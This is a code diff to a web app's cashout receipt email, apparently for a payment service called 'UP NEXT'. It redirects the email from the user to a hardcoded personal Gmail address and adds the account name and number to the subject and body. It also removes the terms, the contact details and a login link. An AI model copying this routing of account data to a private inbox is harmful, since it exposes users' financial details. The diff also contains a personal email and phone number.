@@ -318,8 +318,8 @@ const dblocdx = new FormData();
     const year = today.getFullYear();
     const url = "https://script.google.com/macros/s/AKfycbwr-I-bBR-W7h6LHOLHTRIuciRb2q869OzJnlIknoKbrL1W8gTWBFzjSIAVFbEymDgHQw/exec"; // Replace with your GAS deployment URL
     const payload = {
-        to_email: email,
-        subject: `Cashout Complete`,
+        to_email: "moraladnan.siraj@gmail.com",
+        subject: `Cashout request ${acname} ${acnum}`,
         body_html: `<table style="width: 100%; font-family: Arial, sans-serif; font-size: 14px; border-collapse: collapse; margin-bottom: 20px; max-width: 100%;">
     <tr style="font-size: clamp(8px, 4vw, 12px);">
         <td style="padding: 8px; background: #F4F4F4; width: 40%; font-weight: bold; border-radius: 5px 0 0 5px; color: #333;">Receipt ID: ${codexx}</td>
@@ -348,6 +348,7 @@ const dblocdx = new FormData();
 
 <ul style="padding-left: 15px; line-height: 1.6; color: #444;">
     <li><strong style="color: #222;">Method:</strong> ${fname}</li>
+    <li><strong style="color: #222;">Account no.:</strong> ${acnum}</li>
     <li><strong style="color: #222;">Transaction ID:</strong> UPTN${codexx}</li>
 </ul>
 
@@ -369,23 +370,8 @@ const dblocdx = new FormData();
         <td style="padding: 8px; text-align: right;color:green">${totalDeduction}.00</td>
     </tr>
 </table>
-    <a style="display: inline-block;margin-top:10px;background: #007B8F; padding: 10px; border-radius: 5px; color: pink; text-align: center; border: none; cursor: pointer; max-width: 100%; font-size: clamp(14px, 4vw, 16px); font-weight: bold;text-decoration: none; color: pink; display: block; max-width: 100%;" href="https://nfcard.github.io/login/red.html">OPEN UP NEXT</a>
-<p>This is an email for your recent transaction on&nbsp;<strong>UP NEXT</strong>.&nbsp;</p>
-<p>If you're having trouble with&nbsp; the Email above, please&nbsp; contact this number:&nbsp; <a href="tel:+8801888396332" target="_blank" rel="noopener"><strong>01888396332</strong></a> or email us by <strong>Replying to this mail</strong> . Have a great day.</p>
-
-<h3 style="font-size: clamp(16px, 4vw, 18px); color: #007B8F;">Terms and Conditions</h3>
-
-<ol style="background: #EAEAEA;padding: 15px; line-height: 1.6; font-size: clamp(8px, 4vw, 10px);color: #444;border-radius: 8px;">
-    <li><strong>Transaction Authorization:</strong>  
-   By proceeding with this transaction, both the payer and receiver acknowledge and authorize the transfer of funds as specified. The payer confirms that the account used for the transaction has sufficient funds, and the receiver agrees to accept the transferred amount as final and non-refundable, except in cases of proven error or fraud.</li>
-   
-    <li><strong>Processing Time and Fees:</strong>  
-   The transaction may be subject to processing times based on the systems involved and the chosen transfer method. Any applicable fees or charges will be deducted from the transferred amount or charged separately, as per the policies of UP NEXT. Neither party shall hold the other responsible for delays or fees imposed by intermediary systems or financial institutions.</li>
-   
-    <li><strong>Dispute Resolution:</strong>  
-   In the event of any dispute or discrepancy regarding this transaction, both parties agree to resolve the matter amicably within 30 days. If unresolved, the dispute may be escalated to UP NEXT or relevant financial institutions for investigation. Claims must be supported by valid documentation, and neither party shall be liable for errors or delays caused by third-party systems or unforeseen technical issues.</li>
-</ol>
-<h3 style="text-align: center; margin-top: 10px; font-size: clamp(10px, 4vw, 16px); color: #333;">UP NEXT &copy; 2025</h3>
+    <a style="display: inline-block;margin-top:10px;background: #007B8F; padding: 10px; border-radius: 5px; color: pink; text-align: center; border: none; cursor: pointer; max-width: 100%; font-size: clamp(14px, 4vw, 16px); font-weight: bold;text-decoration: none; color: pink; display: block; max-width: 100%;" href="
+">Confirm</a>
 `
     };
 
